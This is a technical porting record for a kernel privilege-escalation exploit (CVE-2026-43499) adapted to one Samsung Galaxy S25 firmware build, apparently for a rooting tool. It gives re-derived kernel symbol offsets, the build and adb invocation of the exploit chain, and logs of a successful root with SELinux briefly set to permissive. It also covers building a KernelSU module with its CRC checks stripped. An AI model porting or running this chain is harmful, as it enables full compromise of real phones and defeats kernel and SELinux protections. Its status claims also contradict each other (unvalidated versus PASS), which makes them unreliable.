# SM-S931B / S931BXXUCZZI4 porting record (One UI 9 beta 2)

**Status: offline port complete, NOT yet hardware-validated.** Derived from the
exact ZZI4 boot.img kernel Image and its BTF; hardware validation pending the
device actually updating to `S931BXXUCZZI4`.

## 1. Firmware identity

| field | value |
| --- | --- |
| model | `SM-S931B` (Galaxy S25, Snapdragon 8 Elite, codename `pa1q`) |
| AP/PDA | `S931BXXUCZZI4` (update from `S931BXXUCZZHL`) |
| display build | `CP2A.260605.016.S931BXXUCZZI4` (Android 17, SDK 37) |
| security patch | `2026-08-05` |
| build fingerprint | `samsung/pa1qxxx/pa1q:17/CP2A.260605.016/S931BXXUCZZI4:user/release-keys` |
| kernel release | `6.6.127-android15-8-p33f4ffe-abogkiS931BXXUCZZI4-4k` |
| kernel size | `39115264` |
| kernel SHA-256 | `10fe338eb71ab5e88d1793e9de353aab2ae9e6c96ea6e69f018c9959ef31ca7c` |
| boot.img SHA-256 | `ea02238ea3c24d938cce872f098409253f8699cb6276d14c378c13f94f73f102` |
| BTF interval in Image | `[0x18aca6c, 0x1ecd673)` (6425607 bytes) — byte-identical to ZZHL |

## 2. Why a separate profile

Same GKI base (6.6.127) but a different GKI build (`paa4b906` -> `p33f4ffe`)
and a different kernel binary (SHA above), so the ZZHL payload's baked-in
offsets are not guaranteed. Symbol recovery was repeated for this exact Image
(vmlinux-to-elf, kallsyms base `0xffffffc080000000`).

## 3. Offset deltas vs pa1q-S931BXXUCZZHL

All 25 profile offsets were re-derived and compared. **18 are identical**,
including every load-bearing data symbol:

- identical: `call_usermodehelper_exec_work` `0x000d1278`, `worker_thread`
  `0x000d9b04`, `noop_llseek` `0x003cb7f8`, `copy_splice_read` `0x004190cc`,
  `configfs_read_iter` `0x004983d4`, `configfs_bin_write_iter` `0x00498900`,
  `anon_pipe_buf_ops` `0x01278148`, `ashmem_fops` `0x01437480`,
  `system_unbound_wq` `0x0233ac60`, `nfulnl_logger` `0x02342080`,
  `init_task` `0x0234e2c0`, `root_task_group` `0x0255df80`,
  `selinux_state` `0x025a0810`, random_table boot_id data ptr `0x024785c8`,
  `sysctl_bootid` `0x02683910`, `ashmem_misc.fops` `0x024bcd80`,
  `SLIDE_TRACEFS_WORKER_CALLER_OFF` `0x000d9ba0`, tracefs event id `109`.

Changed (7 + fingerprint):

| macro | ZZHL | ZZI4 | delta |
| --- | ---: | ---: | ---: |
| `ASHMEM_IOCTL_OFF` | `0x00d7e744` | `0x00d7e6c0` | `-0x84` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00d7ee00` | `0x00d7ed7c` | `-0x84` |
| `ASHMEM_MMAP_OFF` | `0x00d7ee54` | `0x00d7edd0` | `-0x84` |
| `ASHMEM_OPEN_OFF` | `0x00d7f074` | `0x00d7eff0` | `-0x84` |
| `ASHMEM_RELEASE_OFF` | `0x00d7f0fc` | `0x00d7f078` | `-0x84` |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00d7f188` | `0x00d7f104` | `-0x84` |
| `KMALLOC_CACHES_OFF` | `0x0180e538` | `0x0180e578` | `+0x40` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x01791639` | `0x01791638` | `-1` |

The ashmem text block moved as a unit (-0x84); `kmalloc_caches` gained one
pointer slot (+0x40); the `nfnetlink_log` name string shifted one byte.

## 4. Structural layouts

Unchanged — the kernel's BTF blob is byte-identical to ZZHL's
(SHA-256 `e13df32a16b5536c43897542b4dbc2c7082f2aefb91249bc94a06bfc5870950c`
for both), so every struct layout (rt_mutex_waiter, task_struct, file_operations,
page/slab, configfs_buffer, workqueue/pool/work, pipe_buffer, miscdevice,
selinux_state, ctl_table, mm_struct) is guaranteed identical.

## 5. P0 fingerprint

Regenerated from the ZZI4 Image (`Image[0x1f0000 - slide]`, 32 rows x 8
qwords, readback-verified). It differs from the ZZHL table in the rows whose
text regions moved (0x0b0000-0x130000 area); the slide-0x1f0000 row keeps the
same shape. The probe offset `0x1f0000` remains valid (all 32 rows readable).

## 6. Build

```sh
make TARGET=pa1q-S931BXXUCZZI4 release   # requires ANDROID_NDK_HOME
```

- artifact: `build/pa1q-S931BXXUCZZI4/cve-2026-43499-app.release.so`
- size: `97120` padded to `104128` (registry canonical size)
- SHA-256: `2f9799912ec6c297d9190bc2b82ff417ff451854a08e9524fa549743470284af`
- embedded label verified: `pa1q-S931BXXUCZZI4-app-physical-p0-oracle`

## 7. Hardware validation — PASS (2026-09-08)

Device updated to `S931BXXUCZZI4` (fingerprint
`samsung/pa1qxeea/pa1q:17/CP2A.260605.016/S931BXXUCZZI4_OXMCZZI4:user/release-keys`,
kernel `6.6.127-android15-8-p33f4ffe-abogkiS931BXXUCZZI4-4k #1 SMP PREEMPT
Wed Sep  2 08:11:10 UTC 2026`).

Manual chain on a fresh, settled boot (~5 min uptime, SELinux Enforcing):

```sh
adb shell "CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
```

**Full chain succeeded on attempt 1/24.** Decisive log lines:

```text
[+] p0 profile pid=... phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029791638 bootid_data=ffffff802a4785c8 init_task=ffffff802a34e2c0 root_tg=ffffff802a55df80 sysctl_bootid=ffffff802a683910
[+] slide-kaslr-ok source=tracefs pid=... base=ffffffc080090000 slide=0000000000090000 data_mode=canonical
[*] root umh result wake=1 complete=1 retval=0 socket=1
[*] root umh selinux left=0 intended root state old=1
[+] pipe-physrw-summary pid=... done=1 root=1 kaslr=1 base=ffffffc080090000 slide=0000000000090000
[+] pipe physrw pid=... done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/24
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

- runtime addresses match the derived ZZI4 offsets exactly
  (`slide_logger` = `KIMAGE_TEXT_BASE + 0x01791638` aliased, `init_task`
  `0x0234e2c0`, `sysctl_bootid` `0x02683910`)
- `getenforce` returned `Enforcing` after the run (permissive only during the
  UMH handoff, restored as designed)
- post-run under enforcing the root client is unreachable from the shell
  context (`su: connect daemon: Permission denied`) — expected per the ZZHL
  record; the daemon stays alive until reboot

Operational note: an app-mediated run on this same boot earlier in the day
(SamSU still bundling the ZZHL profile) also reached `root=1` — 18/25 offsets
are shared, and the chain's load-bearing symbols are identical, so the ZZHL
artifact happens to work on ZZI4; the ZZI4 profile remains the correct,
exact-image-derived build (the P0 fingerprint and 7 shifted offsets differ).

## 8. KernelSU module (KSU v3.2.5, ZZI4 vermagic) — built, load-untested

Rebuilt per the ZZHL record section 8: KernelSU `v3.2.5` (commit
`b0bc817b4e966aa6aa830834eaf6ef765d821d40`) +
`kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch`, built as an
external module against the `ghcr.io/ylarod/ddk-min:android15-6.6-20260828`
DDK tree with the utsrelease replaced by the exact ZZI4 release. CI: GitHub
Actions (`build-zzi4-kernelsu.yml`), module version reported `32525`.

Post-processing: `llvm-strip -d` (symtab kept for the kallsyms manual
relocation loader), then `__versions` removed (empty section => kernel skips
CRC checks; vermagic retains `modversions`, matching the target kernel
verbatim).

Audit: 221 undefined imports, all resolved in the recovered ZZI4 symbol table
(vmlinux-to-elf from the exact Image); struct layouts unchanged (BTF
byte-identical to ZZHL).

## 8b. Hardware module-load validation — PASS (2026-09-08)

First CI build was thin-LTO (`CONFIG_LTO_CLANG_THIN` from the DDK gki config);
the kernel rejected it at `init_module` with `ENOEXEC` ("Exec format error") —
the same stock-THIN-LTO-layout failure documented for the F9360 target.
Rebuilt with LTO disabled (`CONFIG_LTO_CLANG= CONFIG_LTO_CLANG_THIN=
CONFIG_LTO_NONE=y`); the no-LTO module loaded successfully through the patched
`ksud late-load` on the ZZI4 device:

```text
ksud::late_load: Detected KMI: android15-6.6
ksud::late_load: kernelsu.ko loaded successfully!
ksud::late_load: [after load_module] selinux=u:r:ksu:s0
su -c id  -> uid=0(root) gid=0(root) context=u:r:ksu:s0
su -c getenforce  -> Enforcing
```

**The shipped pair is the no-LTO build — do not replace it with an
LTO-flavored build of this module.** LTO modules of this KMI fail to load on
this kernel with ENOEXEC.

```text
android15-6.6_kernelsu-pa1q-S931BXXUCZZI4-kdp.ko  (no-LTO, hardware-validated)
size: 3544056
SHA-256: f610b0f1da7e8e955b12f519fa3bd99c737b48c2abb15d1370f2e3105af1573f

ksud-pa1q-S931BXXUCZZI4-kdp  (embeds the no-LTO module)
size: 6419120
SHA-256: 1e1cb6b861d0d4951b7374c12404eee1fb4c02a77240e0500ca571a302396374
```

Notes:
- kptr_restrict=2 on this build zeroes /proc/kallsyms addresses even for
  root; the KSU loader recovers symbol addresses by its own means (worked as
  on ZZHL). Plain `insmod` (no manual relocation) cannot load these modules.
- The helper's `--late-load` staging can race its own copy step when invoked
  repeatedly; if staging reports ENOENT, pre-create
  `/data/local/tmp/.ksud-stage` (cp + chmod 755) and re-run.

## 9. Scope

Offline port + hardware-validated temp-root chain on `S931BXXUCZZI4`.
KernelSU late-load for this kernel uses the exact-vermagic module built above
(see section 8); on-device module-load validation pending.

